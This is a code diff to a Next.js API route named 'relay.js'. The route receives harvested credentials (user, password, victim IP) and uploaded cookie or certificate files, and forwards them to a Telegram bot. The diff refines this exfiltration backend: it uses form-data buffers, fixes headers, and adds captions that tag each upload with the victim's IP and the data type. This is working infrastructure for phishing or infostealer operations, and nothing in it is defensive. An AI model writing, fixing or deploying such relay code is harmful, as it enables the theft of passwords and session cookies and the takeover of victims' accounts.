@@ -1,11 +1,9 @@
 // api/relay.js
+
 import nextConnect from 'next-connect';
 import multer from 'multer';
-import { Blob } from 'buffer';
+import FormData from 'form-data';
 
-//
-// Disable built‐in body parser so we can use multer
-//
 export const config = {
   api: {
     bodyParser: false,
@@ -24,9 +22,6 @@ const handler = nextConnect({
   },
 });
 
-//
-// Accept either JSON (creds) or a multipart file (cookies / cert)
-//
 handler.use(upload.single('file'));
 
 handler.post(async (req, res) => {
@@ -41,10 +36,10 @@ handler.post(async (req, res) => {
   try {
     const contentType = req.headers['content-type'] || '';
 
-    // 🛡️ Credentials JSON payload
+    // Handle JSON payloads (creds, etc.)
     if (contentType.includes('application/json')) {
+      // If you're sending credentials or arbitrary text, handle here
       const { type, ip, user, pass, data } = req.body;
-      // If you sent a free‑form "data" field instead of user/pass:
       const text = data
         ? data
         : `🔑 [${ip}] Credentials\nUser: ${user}\nPass: ${pass}`;
@@ -61,26 +56,39 @@ handler.post(async (req, res) => {
       return res.status(200).json({ success: true });
     }
 
-    // 📂 File payload (cookies or cert)
+    // Handle file uploads (cookies/certs)
     if (req.file) {
-      // Telegram expects 'document' for files
+      // You can also grab req.body.type, req.body.ip if you want
       const form = new FormData();
       form.append('chat_id', chatId);
+
+      // Use Buffer directly for Node/Telegram compatibility
       form.append(
         'document',
-        new Blob([req.file.buffer], { type: 'text/plain' }),
-        req.file.originalname
+        req.file.buffer,
+        {
+          filename: req.file.originalname,
+          contentType: req.file.mimetype || 'text/plain'
+        }
       );
+
+      // Optionally, add a caption with extra info (ip, type, etc)
+      const { ip, type } = req.body;
+      let caption = '';
+      if (ip) caption += `IP: ${ip}\n`;
+      if (type) caption += `Type: ${type}\n`;
+      if (caption.length) form.append('caption', caption);
 
       const tgRes = await fetch(`${botUrl}/sendDocument`, {
         method: 'POST',
-        body: form
+        body: form,
+        headers: form.getHeaders()
       });
       if (!tgRes.ok) throw await tgRes.text();
       return res.status(200).json({ success: true });
     }
 
-    // ❌ Unexpected payload
+    // Bad/unknown payload
     res.status(400).json({ success: false, message: 'Bad payload' });
   } catch (err) {
     console.error('Telegram API error:', err);
